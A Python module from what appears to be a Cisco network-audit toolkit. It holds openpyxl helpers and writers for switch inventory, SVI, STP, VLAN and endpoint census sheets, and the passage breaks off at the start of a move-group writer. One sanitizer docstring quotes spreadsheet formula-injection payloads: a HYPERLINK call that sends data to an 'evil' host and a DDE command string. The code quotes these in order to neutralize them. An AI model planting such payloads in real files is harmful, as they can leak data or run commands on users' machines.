"""The Excel layer's shared helpers: the openpyxl header / sheet-formatting utilities
every write_* sheet uses (`_census_header`, `_census_autofit`), plus the template
header-matching primitives (`norm_header` / `HEADER_TO_FIELD` / `find_header_row` /
`ensure_headers`) and the port-row sort key (`sortkey`). Depends on openpyxl, stdlib,
and cisco_toolkit.textutils (a clean layer above analyze). Extracted verbatim from
COLLECT_PARSE_V3_23_0.py in PHASE 2.7 step 20 (behaviour byte-identical). The sheet
writers themselves follow in later steps; the monolith imports these back meanwhile."""
import ipaddress
import logging
import os
import re
from typing import Dict, List, Optional, Tuple

from openpyxl.cell.cell import Cell, MergedCell
from openpyxl.comments import Comment
from openpyxl.styles import Alignment, Font, PatternFill
from openpyxl.utils import get_column_letter

from cisco_toolkit.analyze import (
    _UNCLASSIFIED_OVERLAY_STATUS, _health_band, _physical_uplink_index, _poe_device_util,
    build_network_model, compute_findings, compute_move_groups, compute_topology_links,
)
from cisco_toolkit.brand_tokens import DOC_NAVY_HEX, WORKBOOK_NAVY_HEX
from cisco_toolkit.cmdio import _load_cmd_output
from cisco_toolkit.model import DevicePhysical, InterfaceData
from cisco_toolkit.parse import (
    _classify_media, _is_physical_port, _parse_fhrp, _parse_poe_watts,
    parse_auth_sessions, parse_bgp_summary, parse_dhcp_snooping_binding,
    parse_eigrp_neighbors, parse_interface_phy, parse_ospf_neighbors,
    parse_port_security, parse_show_interface_counters,
)
from cisco_toolkit.textutils import (
    PHYSICAL_IFACE_RE, _TRUNK_STATUS_WORDS, _split_macs, normalize_ifname, normalize_speed, xml_safe,
)

logger = logging.getLogger(__name__)


# --------------------------------------------------------------------------- defensive coercers
# The house guards (ssot._as_dict / docmeta.as_dict / design_advisor._dict_rows). A sheet writer is
# handed a raw snapshot SECTION on the `--no-collect` rebuild path, so an untrusted file can make it
# a truthy non-dict/non-list. `x or {}` / `x or []` keeps that, and the next `.get()` / iteration
# raises -- which _run_phase catches PER SHEET and logs, so the workbook still SAVES with that entire
# sheet silently missing. That is a coverage-honesty false all-clear (a reader sees an absent sheet,
# not a failure), which is why these degrade to empty instead of raising.
def _sec_dict(v):
    return v if isinstance(v, dict) else {}


def _sec_rows(v):
    """The dict ELEMENTS of a snapshot list section -- the guard for every per-row `.get()` loop."""
    return [r for r in v if isinstance(r, dict)] if isinstance(v, list) else []

#: Excel's hard per-cell character limit. openpyxl enforces it by SILENTLY slicing
#: (`check_string`: `value = value[:32767]`) -- no exception, no warning -- so an oversized cell is
#: amputated inside a workbook that still reports success. `_xls_sanitize` bounds + DISCLOSES instead.
_XLSX_MAX_CELL = 32767
_XLSX_TRUNC_NOTE = " … [TRUNCATED: {n:,} chars exceeded Excel's {cap:,}-char cell limit — see the source capture]"


def _xls_sanitize(value):
    """Strip the characters openpyxl rejects from a string; pass every RENDERABLE non-string through unchanged
    (the two exceptions -- a container, and a non-finite / out-of-float64-range NUMBER -- are bounded by the shared
    textutils.xml_safe this delegates to; see there for why openpyxl OverflowErrors on the huge int at wb.save()
    and SILENTLY blanks inf/nan). Covers BOTH the C0
    control chars (0x00-0x08, 0x0B-0x0C, 0x0E-0x1F) AND the U+FFFE/U+FFFF noncharacters + lone surrogates that pass
    openpyxl's check_string but fail wb.save() at XML serialization (multi-domain audit #11). Device-derived
    free-text (a CDP/LLDP neighbour name, an interface description, a banner) -- collected with errors='ignore',
    which passes valid-UTF-8 control bytes through -- can carry these, and a single one aborts the ENTIRE workbook,
    the one deliverable produced unconditionally (there is no --no-excel). Delegates to the shared
    textutils.xml_safe so the excel + docx generators share ONE implementation of the XML-illegal char set.

    ALSO neutralizes xlsx FORMULA INJECTION (audit-6 sec HIGH): openpyxl marks a STRING cell whose first
    char is '=' as a real formula (data_type='f'), so an attacker-influenced device field -- a hostname,
    interface description, CDP/LLDP neighbour, VLAN name -- set to e.g. =HYPERLINK("http://evil/"&A1,"click")
    or =cmd|'/c calc'!A1 (DDE) EXECUTES in the CLIENT's workbook when they open it (data exfil / link-spoof /
    RCE after the enable-content prompt). The toolkit writes NO intentional formula cells (grep: no
    HYPERLINK/WEBSERVICE/formula construction), so a leading-'=' string is forced back to inert text with
    Excel's text-prefix apostrophe. ('+', '-', '@' are stored by openpyxl as ordinary strings -- NOT live
    formulas in the .xlsx -- and are legitimate leading chars in delta ('+3 added'), placeholder ('-') and
    negative cells, so they are deliberately left unprefixed to avoid corrupting real content on re-read.)

    The '=' test skips LEADING WHITESPACE (review #63): xml_safe deliberately KEEPS tab (0x09), LF (0x0A)
    and CR (0x0D) because they are XML-legal, so a device description of "\\t=cmd|'/c calc'!A1" slipped
    both this guard and openpyxl's own startswith('=') formula detection -- and on the routine
    xlsx->CSV re-export the field lands as a leading-tab formula, which Excel / LibreOffice strip-then-
    evaluate. Testing the first NON-BLANK char closes that bypass; it stays idempotent (a value that
    already carries the apostrophe no longer begins with '=').

    Scope note: this stays a pure XML + formula sanitizer because runbook.py reuses it to clean the
    whole snapshot tree for the DOCX. Excel's per-cell length cap belongs to the workbook write path
    only and lives in `_xls_cell_value`."""
    v = xml_safe(value)
    if isinstance(v, str) and v.lstrip(" \t\r\n").startswith("="):
        v = "'" + v
    return v


def _xls_cell_value(value):
    """`_xls_sanitize` plus Excel's hard 32,767-char per-cell cap (review #87), applied at the workbook
    WRITE chokepoints only.

    openpyxl's `check_string` enforces the limit with a silent `value = value[:32767]` -- no exception
    and no warning -- so an oversized join was amputated mid-content in a workbook that still reported
    success. The worst instance is the remediation plan's `"\\n".join(commands)`: the actual
    configuration an engineer is meant to review and apply. Where this module already bounds a join it
    DISCLOSES the cut (the subnet-reachability '(+N)' pattern), so the cap does the same in-cell rather
    than letting openpyxl truncate invisibly. Idempotent: a value that has already been capped is
    exactly at the limit and passes through untouched."""
    v = _xls_sanitize(value)
    if isinstance(v, str) and len(v) > _XLSX_MAX_CELL:
        note = _XLSX_TRUNC_NOTE.format(n=len(v), cap=_XLSX_MAX_CELL)
        logger.warning("cell value of %d chars exceeds Excel's %d-char limit - truncated WITH a "
                       "disclosure marker (openpyxl would have cut it silently)", len(v), _XLSX_MAX_CELL)
        v = v[:_XLSX_MAX_CELL - len(note)] + note
    return v


def _harden_ws(ws):
    """Wrap one worksheet's cell()/append() so every written string value is sanitized (no IllegalCharacterError).
    Idempotent: a sheet already wrapped (by harden_workbook's create_sheet hook, or by an earlier _new_sheet)
    is left alone rather than double-wrapped."""
    if getattr(ws, "_cisco_hardened", False):
        return
    ws._cisco_hardened = True
    _orig_cell, _orig_append = ws.cell, ws.append

    def _cell(*args, **kwargs):
        if "value" in kwargs:
            kwargs["value"] = _xls_cell_value(kwargs["value"])
        elif len(args) >= 3:
            args = (args[0], args[1], _xls_cell_value(args[2])) + args[3:]
        return _orig_cell(*args, **kwargs)

    def _append(iterable):
        if isinstance(iterable, (list, tuple)):
            iterable = [_xls_cell_value(v) for v in iterable]
        return _orig_append(iterable)

    ws.cell, ws.append = _cell, _append


_CELL_VALUE_GUARDED = False


def _install_cell_value_guard():
    """Sanitize control chars at the openpyxl Cell.value SETTER -- the true write chokepoint. The per-worksheet
    cell()/append() wraps catch ws.cell(value=...) and ws.append([...]), but a writer that gets a cell and then
    assigns ``cell.value = val`` DIRECTLY (e.g. append_interface_rows' w() helper) bypasses them -- and a single
    control char in an interface description there raised IllegalCharacterError mid-loop, which _run_phase (per
    HOST) swallowed, silently dropping every port written AFTER the offending one from the customer-facing
    interface census. Guarding the Cell.value setter closes every direct-assignment path at once. Idempotent +
    process-wide; stripping control chars is always correct for the xlsx format (a no-op on clean strings) and
    only the WRITE path is touched."""
    global _CELL_VALUE_GUARDED
    if _CELL_VALUE_GUARDED:
        return
    prop = Cell.value
    if getattr(prop, "fset", None) is None:                       # defensive: nothing to wrap
        return
    Cell.value = property(prop.fget,
                          lambda self, v: prop.fset(self, _xls_cell_value(v)),
                          getattr(prop, "fdel", None))
    _CELL_VALUE_GUARDED = True


def harden_workbook(wb):
    """Make EVERY worksheet in wb sanitize string cell values, so a control character in any device-derived
    free-text field cannot abort the workbook -- via the Cell.value setter guard (covers DIRECT ``cell.value =``
    assignment, e.g. append_interface_rows) PLUS per-worksheet cell()/append() wraps on every existing sheet
    (the template's own) AND every sheet created later via wb.create_sheet. One chokepoint over all ~329
    cell-write sites + any future one, so the safety can't drift the way a per-site helper would. Returns wb.
    Call once right after load_workbook()."""
    _install_cell_value_guard()
    for ws in wb.worksheets:
        _harden_ws(ws)
    _orig_create = wb.create_sheet

    def _create(*args, **kwargs):
        ws = _orig_create(*args, **kwargs)
        _harden_ws(ws)
        return ws

    wb.create_sheet = _create
    return wb


def _new_sheet(wb, name: str):
    """The ONE way this module creates a sheet. Two structural guarantees every `write_*` needs and
    could previously lose silently:

    1. NAME COLLISION (review #86). `wb.create_sheet(NAME)` on a workbook that ALREADY has a sheet
       called NAME does not raise or warn -- openpyxl renames the new one to 'NAME1'. The workbook is
       built on a CUSTOMER-SUPPLIED template, so a tab the customer already named e.g. 'Executive
       Summary' kept the canonical name while the engine's freshly computed sheet landed beside it as
       'Executive Summary1' (and write_executive_summary_sheet then moved that one to position 0).
       It also made every writer non-idempotent on a second invocation. ~20 writers carried a
       hand-rolled `if NAME in wb.sheetnames: del wb[NAME]`; ~28 did not. Doing it HERE fixes the
       whole class instead of a named subset, and cannot drift again.

       The match must be CASE-INSENSITIVE. openpyxl's own dedupe (`utils.avoid_duplicate_name`) folds
       case, and so does Excel -- a workbook cannot hold both 'Findings' and 'FINDINGS'. An exact-case
       `name in wb.sheetnames` therefore missed a customer tab named 'FINDINGS' / 'executive summary',
       openpyxl renamed the engine's sheet to 'Findings1' anyway, and the whole defect reopened on the
       one input it is written for (a customer-supplied template, where tab casing is arbitrary). The
       Executive Summary is the worst instance again: it then move_sheet()s the MIS-NAMED duplicate to
       position 0 while the customer's stale tab keeps the canonical name.

    2. SANITIZATION (review #63). Every `write_*` is a PUBLIC entry point taking a caller-built
       workbook, but the control-char / formula-injection guard lived only in `harden_workbook()`,
       which no writer called or asserted -- a caller that skipped it lost both protections with no
       signal. Creating the sheet through here installs the Cell.value setter guard (process-wide,
       idempotent) and wraps the new sheet's cell()/append(), so a writer is safe on its own.
       `harden_workbook()` is still the right call for the TEMPLATE's pre-existing sheets."""
    _install_cell_value_guard()
    for existing in [s for s in wb.sheetnames if s.lower() == (name or "").lower()]:
        del wb[existing]
    ws = wb.create_sheet(name)
    _harden_ws(ws)
    return ws


_CENSUS_HDR_FILL = WORKBOOK_NAVY_HEX

def _census_header(ws, columns):
    hf = Font(name="Calibri", bold=True, color="FFFFFF", size=10)
    fill = PatternFill("solid", fgColor=_CENSUS_HDR_FILL)
    al = Alignment(horizontal="center", vertical="center", wrap_text=True)
    for col, header in enumerate(columns, 1):
        c = ws.cell(row=1, column=col, value=header)
        c.font = hf; c.fill = fill; c.alignment = al
    ws.row_dimensions[1].height = 30

def _census_autofit(ws, ncols, nrows):
    for col in range(1, ncols + 1):
        mx = len(str(ws.cell(row=1, column=col).value or ""))
        for row in range(2, nrows + 1):
            v = ws.cell(row=row, column=col).value
            if v: mx = max(mx, len(str(v)))
        ws.column_dimensions[get_column_letter(col)].width = min(max(mx + 2, 12), 48)
    ws.freeze_panes = "A2"

def norm_header(h: str) -> str:
    h = (h or "").strip().lower()
    return re.sub(r"\s+", " ", h)

HEADER_TO_FIELD = {
    "hostname": "hostname", "ports": "port", "status": "status",
    "swqitchport mode": "switchport_mode",
    "swqitchport mode (access/trunk)": "switchport_mode",
    "switchport mode": "switchport_mode",
    "switchport mode (access/trunk)": "switchport_mode",
    "vlan": "vlan", "vlan name": "vlan_name",
    "vrf name": "vrf", "vrf name ": "vrf",
    "duplex": "duplex", "duplex (full/half/auto)": "duplex",
    "speed": "speed", "port type": "port_type",
    "link type (copper/fiber)": "link_type", "link type (copper/fibre)": "link_type",
    "link type": "link_type", "description": "description",
    "end host mac address": "end_host_mac", "end host ip address": "end_host_ip",
    "port-channel": "port_channel",
    "port-channel protocol (active/on/none)": "port_channel_protocol",
    "port-channel protocol": "port_channel_protocol",
    "spanning tree block ports status": "stp_blocked",
    "spanning tree bpdu (enable/disable)": "stp_bpduguard",
    "spanning tree bpdu": "stp_bpduguard",
    "spanning tree rootguard (enable/disable)": "stp_rootguard",
    "spanning tree rootguard": "stp_rootguard",
    "poe status": "poe_status",
    "system owner (customer to confirm)": "system_owner", "system owner": "system_owner",
    "end point type": "endpoint_type",
    "end point location rack-unit": "endpoint_location", "end point location": "endpoint_location",
    "dual connection": "dual_connection",
    "trunk native vlan": "trunk_native_vlan",
    "trunk allowed vlans": "trunk_allowed_vlans",
    "trunk status": "trunk_status",
    # NEW-V11
    "arp source switch": "arp_source_switch",
    "arp source":        "arp_source_switch",
    "cdp neighbor":      "cdp_neighbor",
    "cdp/lldp neighbor": "cdp_neighbor",
    "connected device":  "cdp_neighbor",
    "neighbor device":   "cdp_neighbor",
    # NEW-V14.2 (keys must match the header text written by ensure_headers in main())
    "current switch serial":      "current_switch_serial",
    "current switch mgmt ip":     "current_switch_ip",
    "current switch vtp domain":  "current_switch_vtp_domain",
    "neighbor switch serial":     "neighbor_switch_serial",
    "neighbor switch mgmt ip":    "neighbor_switch_ip",
    "neighbor switch vtp domain": "neighbor_switch_vtp_domain",
    "subnet primary route":       "subnet_primary_route",
    "subnet secondary routes":    "subnet_secondary_routes",
    "route next hop":             "route_next_hop",
    "routing source":             "routing_source",
    "hsrp behavior":              "hsrp_behavior",
    "fhrp behavior":              "hsrp_behavior",  # NEW-V14.6 canonical (HSRP/VRRP/GLBP)
    "multicast info":             "multicast_info",
    # Aliases
    "port": "port", "interface": "port", "state": "status",
}

def find_header_row(ws, must_have=("hostname","port","status")) -> Tuple[int, Dict[str,int]]:
    for r in range(1, 301):
        col_map: Dict[str,int] = {}
        for c in range(1, ws.max_column+1):
            val = ws.cell(row=r, column=c).value
            if not isinstance(val, str): continue
            nh = norm_header(val)
            if nh in HEADER_TO_FIELD:
                field = HEADER_TO_FIELD[nh]
                if field not in col_map: col_map[field] = c
        if all(k in col_map for k in must_have):
            return r, col_map
    raise RuntimeError("Could not find header row. Try --debug-headers")

def ensure_headers(ws, header_row, col_map, new_headers):
    for header_text, field in new_headers.items():
        if field in col_map: continue
        new_col = ws.max_column + 1
        ws.cell(row=header_row, column=new_col, value=header_text)
        col_map[field] = new_col
    return col_map

def sortkey(portname: str):
    pn = normalize_ifname(portname or "")
    m  = re.match(r"^Po(\d+)$", pn, re.IGNORECASE)
    if m: return (0, int(m.group(1)), 0, 0)
    m = re.match(r"^(Eth|Fa|Gi|Te|Tw|Fo|Hu)(\d+)(?:/(\d+))?(?:/(\d+))?$", pn, re.IGNORECASE)
    if m:
        pref = m.group(1).capitalize()
        rank = {"Eth":1,"Fa":2,"Gi":3,"Te":4,"Tw":5,"Fo":6,"Hu":7}.get(pref, 9)
        return (rank, int(m.group(2)), int(m.group(3) or 0), int(m.group(4) or 0))
    return (99, pn)


# =============================================================================
# Census / inventory sheet writers (PHASE 2.7 step 21). One row per switch / SVI /
# STP port / VLAN / endpoint - pure renders of the parsed model (no analyze compute).
# =============================================================================
INVENTORY_SHEET_NAME = "Switch Inventory"

INVENTORY_COLUMNS = [
    ("Hostname",            "hostname"),
    ("Platform",            "platform"),
    ("Model / PID",         "model"),
    ("Serial Number",       "serial_number"),
    ("Chassis Serial",      "chassis_serial"),
    ("SW Version",          "sw_version"),
    ("Uptime",              "uptime"),
    ("System MAC",          "system_mac"),
    ("# Power Supplies",    "num_power_supplies"),
    ("PS Status",           "ps_status"),
    ("Power Capacity (W)",  "power_capacity_w"),
    ("Power Drawn (W)",     "power_drawn_w"),
    ("Power Remaining (W)", "power_remaining_w"),
    ("# Modules",           "num_modules"),
    ("Total Ports",         "total_ports"),
    ("Active Ports",        "active_ports"),
    ("Fan Status",          "fan_status"),
    ("Temperature Status",  "temperature_status"),
]

def write_device_inventory_sheet(wb, all_device_physical: List[DevicePhysical]) -> None:
    """Write (or replace) 'Switch Inventory' sheet with one row per switch."""

    if INVENTORY_SHEET_NAME in wb.sheetnames:
        del wb[INVENTORY_SHEET_NAME]
    ws = _new_sheet(wb, INVENTORY_SHEET_NAME)
    HDR_FONT  = Font(name="Calibri", bold=True, color="FFFFFF", size=10)
    HDR_FILL  = PatternFill("solid", fgColor=WORKBOOK_NAVY_HEX)
    HDR_ALIGN = Alignment(horizontal="center", vertical="center", wrap_text=True)
    DAT_FONT  = Font(name="Calibri", size=10)
    DAT_L     = Alignment(horizontal="left",   vertical="center")
    DAT_C     = Alignment(horizontal="center", vertical="center")
    _NUM      = {"num_power_supplies","num_modules","total_ports","active_ports"}

    for col, (header, _) in enumerate(INVENTORY_COLUMNS, 1):
        c = ws.cell(row=1, column=col, value=header)
        c.font = HDR_FONT; c.fill = HDR_FILL; c.alignment = HDR_ALIGN
    ws.row_dimensions[1].height = 30

    for row, dp in enumerate(all_device_physical, 2):
        for col, (_, field) in enumerate(INVENTORY_COLUMNS, 1):
            val = getattr(dp, field, "")
            # `val == 0 -> ""` is right for the int fields model.DevicePhysical declares `int = 0` with no
            # None state (num_power_supplies / num_modules / total_ports): 0 there IS the not-observed
            # marker. `active_ports` is the ONE exception -- it is `int | None`, where None means the
            # up/down state was never observed and 0 is an OBSERVED fact (every port down). Blanking both
            # made this sheet contradict the Capacity sheet of the SAME workbook, which renders the pair as
            # 0 vs blank (review #55, fixed there only). Same defect class, a second exit.
            if field == "active_ports":
                val = "" if val is None else val
            elif val == 0:
                val = ""
            c = ws.cell(row=row, column=col, value=val)
            c.font = DAT_FONT
            c.alignment = DAT_C if field in _NUM else DAT_L

    for col, (header, _) in enumerate(INVENTORY_COLUMNS, 1):
        mx = len(header)
        for row in range(2, len(all_device_physical) + 2):
            v = ws.cell(row=row, column=col).value
            if v: mx = max(mx, len(str(v)))
        ws.column_dimensions[get_column_letter(col)].width = min(max(mx + 2, 12), 48)

    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{INVENTORY_SHEET_NAME}' sheet: {len(all_device_physical)} device(s)")

# =============================================================================
# NEW-V14.3: SVI / Gateway sheet (one row per SVI) - surfaces the per-SVI routing,
# HSRP and multicast data that the interface sheet excludes by design.
# =============================================================================
SVI_SHEET_NAME = "SVI Gateway"

SVI_COLUMNS = [
    ("Hostname",               "hostname"),
    ("SVI",                    "port"),
    ("Description",            "description"),
    ("VLAN",                   "vlan"),
    ("VRF",                    "vrf"),
    ("Gateway IP (configured)","svi_ip"),
    ("Subnet / Primary Route", "subnet_primary_route"),
    ("Routing Source",         "routing_source"),
    ("Route Next Hop",         "route_next_hop"),
    ("Secondary Routes",       "subnet_secondary_routes"),
    ("FHRP Behavior",          "hsrp_behavior"),
    ("Multicast Info",         "multicast_info"),
    ("Switch Serial",          "current_switch_serial"),
    ("Switch Mgmt IP",         "current_switch_ip"),
    ("VTP Domain",             "current_switch_vtp_domain"),
]

def _is_svi(port: str) -> bool:
    return bool(re.match(r"^Vlan\d+$", (port or "").strip(), re.IGNORECASE))

def write_svi_gateway_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write (or replace) 'SVI Gateway' sheet: one row per SVI across all devices.

    This is the home for the per-SVI fields (routing / HSRP / multicast) that
    append_interface_rows() intentionally skips, since the interface sheet drops
    Vlan/loopback/tunnel rows. Physical-port rows are unaffected.
    """

    if SVI_SHEET_NAME in wb.sheetnames:
        del wb[SVI_SHEET_NAME]
    ws = _new_sheet(wb, SVI_SHEET_NAME)
    HDR_FONT  = Font(name="Calibri", bold=True, color="FFFFFF", size=10)
    HDR_FILL  = PatternFill("solid", fgColor=WORKBOOK_NAVY_HEX)
    HDR_ALIGN = Alignment(horizontal="center", vertical="center", wrap_text=True)
    DAT_FONT  = Font(name="Calibri", size=10)
    DAT_L     = Alignment(horizontal="left",   vertical="center")

    for col, (header, _) in enumerate(SVI_COLUMNS, 1):
        c = ws.cell(row=1, column=col, value=header)
        c.font = HDR_FONT; c.fill = HDR_FILL; c.alignment = HDR_ALIGN
    ws.row_dimensions[1].height = 30

    # Collect SVIs, sorted by hostname then numeric VLAN id for a stable, readable sheet.
    rows: List[Tuple[str, InterfaceData]] = []
    for hostname, ifaces in all_interfaces.items():
        for port, d in ifaces.items():
            if _is_svi(port):
                rows.append((hostname, d))
    def _vlan_id(p: str) -> int:
        m = re.search(r"(\d+)", p or "")
        return int(m.group(1)) if m else 0
    rows.sort(key=lambda hd: (hd[0].lower(), _vlan_id(hd[1].port)))

    r = 2
    for hostname, d in rows:
        for col, (_, field) in enumerate(SVI_COLUMNS, 1):
            val = hostname if field == "hostname" else getattr(d, field, "")
            c = ws.cell(row=r, column=col, value=val)
            c.font = DAT_FONT; c.alignment = DAT_L
        r += 1

    for col, (header, _) in enumerate(SVI_COLUMNS, 1):
        mx = len(header)
        for row in range(2, r):
            v = ws.cell(row=row, column=col).value
            if v: mx = max(mx, len(str(v)))
        ws.column_dimensions[get_column_letter(col)].width = min(max(mx + 2, 12), 48)

    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{SVI_SHEET_NAME}' sheet: {len(rows)} SVI(s)")


# =============================================================================
# NEW-V14.7: STP Detail sheet (one row per STP port) - shows WHICH VLANs each port
# forwards vs blocks, instead of the single collapsed state on the interface sheet.
# =============================================================================
STP_SHEET_NAME = "STP Detail"

STP_COLUMNS = [
    ("Hostname",          "hostname"),
    ("Port",              "port"),
    ("STP Summary",       "_summary"),       # computed: Forwarding / Blocked / Mixed (FWD+BLK)
    ("Forwarding VLANs",  "stp_fwd_vlans"),
    ("Blocked VLANs",     "stp_blk_vlans"),
    ("Other (Lis/Lrn/Dis)", "stp_other_vlans"),
]

def write_stp_detail_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write (or replace) 'STP Detail': one row per port that appears in 'show spanning-tree',
    with the per-VLAN forwarding/blocking breakdown. Ports with no STP data are omitted.
    Under MST the VLAN columns hold MST instance numbers (see header note in the docs)."""

    if STP_SHEET_NAME in wb.sheetnames:
        del wb[STP_SHEET_NAME]
    ws = _new_sheet(wb, STP_SHEET_NAME)
    HDR_FONT  = Font(name="Calibri", bold=True, color="FFFFFF", size=10)
    HDR_FILL  = PatternFill("solid", fgColor=WORKBOOK_NAVY_HEX)
    HDR_ALIGN = Alignment(horizontal="center", vertical="center", wrap_text=True)
    DAT_FONT  = Font(name="Calibri", size=10)
    DAT_L     = Alignment(horizontal="left", vertical="center")

    for col, (header, _) in enumerate(STP_COLUMNS, 1):
        c = ws.cell(row=1, column=col, value=header)
        c.font = HDR_FONT; c.fill = HDR_FILL; c.alignment = HDR_ALIGN
    ws.row_dimensions[1].height = 30

    rows: List[Tuple[str, InterfaceData]] = []
    for hostname, ifaces in all_interfaces.items():
        for d in ifaces.values():
            if d.stp_fwd_vlans or d.stp_blk_vlans or d.stp_other_vlans:
                rows.append((hostname, d))

    def _natkey(hd):
        host, d = hd
        m = re.findall(r"\d+", d.port or "")
        return (host.lower(), d.port[:2].lower(), [int(x) for x in m])
    rows.sort(key=_natkey)

    def _summary(d: InterfaceData) -> str:
        f, b = bool(d.stp_fwd_vlans), bool(d.stp_blk_vlans)
        if f and b: return "Mixed (FWD+BLK)"
        if b:       return "Blocked"
        if f:       return "Forwarding"
        return d.stp_other_vlans and "Transitional" or ""

    r = 2
    for hostname, d in rows:
        for col, (_, field) in enumerate(STP_COLUMNS, 1):
            if field == "hostname":  val = hostname
            elif field == "_summary": val = _summary(d)
            else:                     val = getattr(d, field, "")
            c = ws.cell(row=r, column=col, value=val)
            c.font = DAT_FONT; c.alignment = DAT_L
        r += 1

    for col, (header, _) in enumerate(STP_COLUMNS, 1):
        mx = len(header)
        for row in range(2, r):
            v = ws.cell(row=row, column=col).value
            if v: mx = max(mx, len(str(v)))
        ws.column_dimensions[get_column_letter(col)].width = min(max(mx + 2, 12), 48)

    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{STP_SHEET_NAME}' sheet: {len(rows)} STP port(s)")


# =============================================================================
# NEW-V14.8: VLAN Census + Endpoint Census sheets (aggregations of the interface DB).
# =============================================================================
VLAN_CENSUS_SHEET_NAME = "VLAN Census"
ENDPOINT_CENSUS_SHEET_NAME = "Endpoint Census"

def write_vlan_census_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """One row per access/SVI VLAN -- the subset of the in-use VLANs that have an access port and/or a
    collected SVI, aggregated across all devices: where it lives, access-port and endpoint (MAC) counts,
    and its gateway/SVI. NOTE: this is a labelled SUBSET, not the in-use total -- the canonical "VLANs in
    use" count (executive_brief.scale.n_vlans, from analyze.vlan_inventory) also includes querier-only
    VLANs whose gateway sits on an uncollected device, which cannot populate a per-VLAN row here."""
    cols = ["VLAN ID", "Name", "# Switches", "Switches", "# Access Ports", "# Endpoints",
            "Gateway Switch(es)", "Gateway IP", "Subnet", "FHRP"]
    if VLAN_CENSUS_SHEET_NAME in wb.sheetnames:
        del wb[VLAN_CENSUS_SHEET_NAME]
    ws = _new_sheet(wb, VLAN_CENSUS_SHEET_NAME)
    _census_header(ws, cols)

    agg: Dict[int, Dict[str, object]] = {}
    def fresh():
        return {"name": "", "switches": set(), "access_ports": 0, "macs": set(),
                "gw_switches": set(), "gw_ip": "", "subnet": "", "fhrp": ""}
    for hostname, ifaces in all_interfaces.items():
        for port, d in ifaces.items():
            # access ports in this VLAN
            if (d.switchport_mode or "") == "Access" and d.vlan.isdigit():
                vid = int(d.vlan); a = agg.setdefault(vid, fresh())
                a["switches"].add(hostname); a["access_ports"] += 1
                if d.vlan_name and not a["name"]: a["name"] = d.vlan_name
                for mac in _split_macs(d.end_host_mac): a["macs"].add(mac)
            # SVI = the gateway for this VLAN
            m = re.match(r"^Vlan(\d+)$", port, re.IGNORECASE)
            if m:
                vid = int(m.group(1)); a = agg.setdefault(vid, fresh())
                a["gw_switches"].add(hostname)
                if d.vlan_name and not a["name"]: a["name"] = d.vlan_name
                if d.svi_ip and not a["gw_ip"]: a["gw_ip"] = d.svi_ip
                if d.subnet_primary_route and not a["subnet"]: a["subnet"] = d.subnet_primary_route
                if d.hsrp_behavior and not a["fhrp"]: a["fhrp"] = d.hsrp_behavior

    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    r = 2
    for vid in sorted(agg.keys()):
        a = agg[vid]
        vals = [vid, a["name"], len(a["switches"]), ", ".join(sorted(a["switches"])),
                a["access_ports"], len(a["macs"]),
                ", ".join(sorted(a["gw_switches"])), a["gw_ip"], a["subnet"], a["fhrp"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{VLAN_CENSUS_SHEET_NAME}' sheet: {len(agg)} VLAN(s)")

def write_endpoint_census_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Flat list of endpoints across all devices: one row per port that has a learned MAC."""
    cols = ["Hostname", "Port", "VLAN", "VLAN Name", "MAC Address", "IP Address",
            "Endpoint Type", "Location", "CDP/LLDP Neighbor"]
    if ENDPOINT_CENSUS_SHEET_NAME in wb.sheetnames:
        del wb[ENDPOINT_CENSUS_SHEET_NAME]
    ws = _new_sheet(wb, ENDPOINT_CENSUS_SHEET_NAME)
    _census_header(ws, cols)

    rows: List[Tuple[str, InterfaceData]] = []
    for hostname, ifaces in all_interfaces.items():
        for d in ifaces.values():
            if d.end_host_mac and (d.switchport_mode or "") != "Trunk":
                rows.append((hostname, d))
    def _key(hd):
        host, d = hd
        vid = int(d.vlan) if d.vlan.isdigit() else 0
        nums = [int(x) for x in re.findall(r"\d+", d.port or "")]
        return (host.lower(), vid, d.port[:2].lower(), nums)
    rows.sort(key=_key)

    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    r = 2
    for hostname, d in rows:
        vals = [hostname, d.port, d.vlan, d.vlan_name, d.end_host_mac, d.end_host_ip,
                d.endpoint_type, d.endpoint_location, d.cdp_neighbor]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
        r += 1
    # Disclose the basis vs the canonical evidenced-endpoint total: this sheet lists learned MACs on ALL
    # host-facing (non-trunk) ports, a SUPERSET of executive_brief.scale.n_endpoints, which counts only ports
    # explicitly tagged switchport mode 'Access'. Without this the row count silently contradicts the Exec
    # Summary headline (Meridian: 5326 here vs 5127 there) -- the same disclosure the VLAN Census / Migration Readiness
    # sheets carry (audit-4 #17).
    n_access = sum(1 for _h, d in rows if (d.switchport_mode or "") == "Access")
    if len(rows) != n_access:
        note = ws.cell(r + 1, 1,
                       f"Basis: {len(rows)} learned-MAC endpoints on host-facing (non-trunk) ports. The canonical "
                       f"'evidenced endpoints' total (executive_brief.scale.n_endpoints) counts only the {n_access} "
                       f"on ports explicitly tagged switchport mode 'Access'; the other {len(rows) - n_access} are "
                       f"real MACs on ports whose access-mode was not tagged 'Access'. The two use different bases.")
        note.font = Font(name="Calibri", size=9, italic=True, color="808080")
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{ENDPOINT_CENSUS_SHEET_NAME}' sheet: {len(rows)} endpoint(s)")


# =============================================================================
# Analysis sheet writers (PHASE 2.7 step 22): move-group / topology / findings /
# capacity sheets + the Mermaid/Graphviz topology diagram. These call the analyze
# layer's compute_* (excel sits above analyze, so excel -> analyze is one-way).
# =============================================================================
MOVEGROUP_SHEET_NAME = "Move Groups"

def write_move_group_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
